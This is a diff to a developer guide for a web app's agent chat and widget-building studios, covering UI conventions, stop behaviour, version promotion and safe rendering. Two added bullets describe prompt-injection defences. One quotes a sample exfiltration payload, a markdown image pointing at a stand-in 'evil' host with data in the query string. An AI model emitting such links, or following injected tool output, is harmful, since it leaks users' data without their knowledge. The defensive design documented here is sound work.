@@ -216,7 +216,7 @@ Two behaviors there are easy to break by accident:
 - **Saving stays on the page.** `handlePublish` reports through the inline
   `saveNotice` and does not call `onClose`; people save every few minutes and a
   modal or a navigation for each one is what this replaced. That makes `onClose`
-  the Done button's job alone, and it is the only thing that clears
+  the close (X) button's job alone, and it is the only thing that clears
   `editWidgetId` — without it, reopening the studio reloads the widget over
   unsaved work. Session state is likewise cleared on close, not on save.
 - **Agent settings are per user, so they live in `localStorage`.** `app_settings`
@@ -236,6 +236,20 @@ Two behaviors there are easy to break by accident:
   *after* a clean compile, so sharing the counter means no limit at all and a
   widget that throws every render regenerates forever. `renderRetryCountRef` is
   reset only by a deliberate act: a typed request, Reload, or a restore.
+- **The header over the chat is for the chat.** Only Agent settings sit there;
+  everything about the widget (History, Reload, Promote, the ⋯ menu, Save, close)
+  is in the workspace header, and `saveNotice` renders under it. Agent Studio
+  follows the same rule. Keep new widget actions on the right.
+- **Stop is immediate; "Stop after this step" is graceful.** The composer's
+  `SendStopButton` clears the poll, `DELETE`s the job and settles the turn itself,
+  ignoring anything the job produces afterwards. A stopped turn never calls
+  `onSettled` (no review) and blocks the automatic fixes until a deliberate act.
+  Enter does nothing while a turn runs — it used to start a second job.
+- **Promotion reuses the admin screen's logic.** `WidgetPromotionPanel` and
+  `pages/admin/WidgetManager.tsx` both go through `src/promotion.ts`. An env's
+  current version is its *highest* non-deprecated row, and version numbers are per
+  env, so never match versions across envs by number. The panel is keyed on a save
+  counter so a publish refreshes it.
 
 Category and domain come from `/api/taxonomy/*`. A failed load keeps the previous
 values and shows a retry rather than falling back to an empty list — an empty
@@ -368,7 +382,9 @@ worth keeping:
 `RELEASE_NOTES.md` at the repo root is imported with `?raw` by
 `pages/ReleaseNotesPage.tsx`, reached from the Resources group in the sidebar. It
 is bundled at build time, so a deployment's notes always match its code. Update
-it in the same commit as any user-visible change.
+it in the same commit as any user-visible change, following the conventions in
+its opening comment: one concise bullet per change, a bold lead plus one short
+sentence.
 
 That page strips HTML comments before rendering. `react-markdown` has no raw-HTML
 plugin here, so it *escapes* HTML into visible text rather than dropping it, and
@@ -474,6 +490,26 @@ Things worth knowing before changing this:
   `SentAttachments` are used by both this panel (light) and Widget Studio
   (`variant="dark"`). Both chats grew their own copy first; if you need a third
   look, add a variant rather than a fourth copy.
+- **Charts are fenced `vega-lite` blocks** drawn by `components/VegaChart.tsx`
+  through a `pre` override in `AgentConversation` (so Agent Studio's "Try it" gets
+  them too). The spec is model-written, possibly after reading injected tool
+  output, so it must never reach the network: the loader refuses everything,
+  expressions are interpreted (`ast: true` + `vega-interpreter`, also the CSP-safe
+  path), `usermeta` is stripped so a spec can't override those options, and the
+  editor/source actions are off. Vega is ~850 kB, so it stays behind `import()`.
+  Streaming state reaches the override through context, not a closure, so a drawn
+  chart isn't remounted by every chunk.
+- **Chat markdown loads only same-origin images** (`components/ChatImage.tsx`,
+  wired into the drawer, Widget Studio and Agent Studio renderers). An image loads
+  on render, so an injected `![](https://evil/?q=<data>)` would exfiltrate without
+  a click, and the CSP can't close it because widgets may show images from
+  anywhere. Any new renderer of model-written markdown must use it too.
+- **Every chat composer uses `components/SendStopButton.tsx`.** It never takes
+  focus and the two states are different elements, so Enter in the box can't land
+  on Stop; the caller's Enter handler must do nothing while a turn runs. In the
+  drawer, `stop()` posts the turn's `turn_id` to `/api/agent/chat/stop` before
+  aborting: a bare disconnect
+  deliberately lets a saved turn finish (see server/AGENTS.md).
 - `components/ConversationHistory.tsx` is the header dropdown (list, rename,
   delete). It reads the list on open rather than subscribing, since it only changes
   when a turn completes or the user acts there. Postgres timestamps arrive without
